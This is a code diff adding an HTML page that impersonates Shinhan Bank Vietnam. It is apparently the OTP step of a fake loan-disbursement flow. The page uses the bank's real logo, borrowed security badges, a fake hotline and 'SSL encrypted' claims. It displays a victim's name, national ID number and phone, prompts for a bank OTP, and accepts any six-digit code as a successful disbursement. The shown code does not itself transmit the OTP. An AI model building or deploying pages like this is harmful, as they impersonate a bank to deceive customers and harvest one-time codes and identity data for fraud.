@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xác Nhận Giải Ngân Qua ATM - Shinhan Bank</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        header img {
+            height: 50px;
+        }
+
+        h2 {
+            color: #003087;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .steps {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .step {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            background-color: #e0e0e0;
+            margin: 0 5px;
+            border-radius: 5px;
+            display: none;
+        }
+
+        .step.active {
+            background-color: #003087;
+            color: #fff;
+            display: block;
+        }
+
+        .summary {
+            margin-bottom: 20px;
+            padding: 10px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+        }
+
+        .summary p {
+            margin: 5px 0;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .form-group .error {
+            color: red;
+            font-size: 12px;
+            display: none;
+        }
+
+        .form-group .error.show {
+            display: block;
+        }
+
+        .timer {
+            color: red;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button.primary {
+            background-color: #003087;
+            color: #fff;
+        }
+
+        button.secondary {
+            background-color: #ccc;
+            color: #333;
+        }
+
+        footer {
+            background-color: #003087;
+            color: #fff;
+            text-align: center;
+            padding: 20px 0;
+            margin-top: 20px;
+        }
+
+        footer img {
+            height: 30px;
+            margin: 10px;
+        }
+
+        footer a {
+            color: #fff;
+            margin: 0 10px;
+        }
+    </style>
+</head>
+<body>
+    <header aria-label="Main Header">
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo">
+    </header>
+
+    <div class="container">
+        <h2>Xác Nhận Giải Ngân Qua ATM</h2>
+        <div class="steps" role="progressbar" aria-label="Disbursement Progress">
+            <div class="step" id="step1">Bước 1: Nhập thông tin</div>
+            <div class="step" id="step2">Bước 2: Xác nhận</div>
+            <div class="step active" id="step3" aria-current="step">Bước 3: OTP</div>
+        </div>
+        <div class="summary">
+            <h3>Thông tin giải ngân</h3>
+            <p>Họ và Tên: <span id="summaryName"></span></p>
+            <p>Số CCCD: <span id="summaryCCCD"></span></p>
+            <p>Số tiền: <span id="summaryAmount"></span></p>
+            <p>Thời hạn vay: <span id="summaryMonths"></span> tháng</p>
+            <p>Ngân hàng: <span id="summaryBank"></span></p>
+            <p>Số điện thoại: <span id="summaryPhone"></span></p>
+        </div>
+        <div class="form-group" aria-live="polite">
+            <p>OTP đã gửi từ Shinhan Bank (1900-1234) đến ****1234</p>
+            <label for="otp">Mã OTP</label>
+            <input type="text" id="otp" required aria-describedby="otpError">
+            <span class="error" id="otpError">Vui lòng nhập mã OTP hợp lệ</span>
+        </div>
+        <p class="timer" id="otpTimer">Còn 60 giây</p>
+        <div class="buttons">
+            <button class="primary" onclick="verifyOTP()">Gửi</button>
+            <button class="secondary" id="resendOTP" disabled onclick="resendOTP()">Gửi lại OTP (60s)</button>
+            <button class="secondary" onclick="window.location.href='index.html'">Hủy</button>
+        </div>
+    </div>
+
+    <footer role="contentinfo" aria-label="Footer">
+        <p>Liên hệ: <a href="mailto:support@shinhanbank.vn">support@shinhanbank.vn</a> | Hotline: 1900-1234</p>
+        <p><a href="#">Hỗ trợ trò chuyện</a></p>
+        <p>Kết nối an toàn với SSL</p>
+        <img src="https://pg.megapay.vn/pg_was/images/pg/bankContents/PCIDSS.png?v2" alt="PCI DSS">
+        <img src="https://simg.zalopay.com.vn/zst/zlp-website/resources/images/footer/BCTLogo_1.png" alt="Bộ Công Thương">
+        <p>Dữ liệu được mã hóa với SSL</p>
+        <p>© 2025 Shinhan Bank Việt Nam. All Rights Reserved.</p>
+        <p>Địa chỉ: Tầng 12, Tòa nhà Vincom Center, 72 Lê Thánh Tôn, Quận 1, TP. Hồ Chí Minh</p>
+    </footer>
+
+    <script>
+        let otpCountdown = 60;
+        let otpInterval;
+
+        // Load Summary
+        window.addEventListener('load', () => {
+            const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+            document.getElementById('summaryName').textContent = formData.fullName || 'N/A';
+            document.getElementById('summaryCCCD').textContent = formData.cccd || 'N/A';
+            document.getElementById('summaryAmount').textContent = formData.amount || 'N/A';
+            document.getElementById('summaryMonths').textContent = formData.months || 'N/A';
+            document.getElementById('summaryBank').textContent = formData.bank || 'N/A';
+            document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
+        });
+
+        function startOTPTimer() {
+            otpCountdown = 60;
+            document.getElementById('otpTimer').textContent = `Còn ${otpCountdown} giây`;
+            document.getElementById('resendOTP').disabled = true;
+            otpInterval = setInterval(() => {
+                otpCountdown--;
+                document.getElementById('otpTimer').textContent = `Còn ${otpCountdown} giây`;
+                if (otpCountdown <= 0) {
+                    clearInterval(otpInterval);
+                    document.getElementById('resendOTP').disabled = false;
+                }
+            }, 1000);
+        }
+
+        function verifyOTP() {
+            const otp = document.getElementById('otp').value.trim();
+            if (/^\d{6}$/.test(otp)) {
+                sessionStorage.removeItem('formData');
+                alert('Giải ngân qua ATM thành công!');
+                window.location.href = 'index.html';
+            } else {
+                document.getElementById('otpError').classList.add('show');
+            }
+        }
+
+        function resendOTP() {
+            alert('OTP đã được gửi lại!');
+            startOTPTimer();
+        }
+
+        startOTPTimer();
+    </script>
+</body>
+</html>
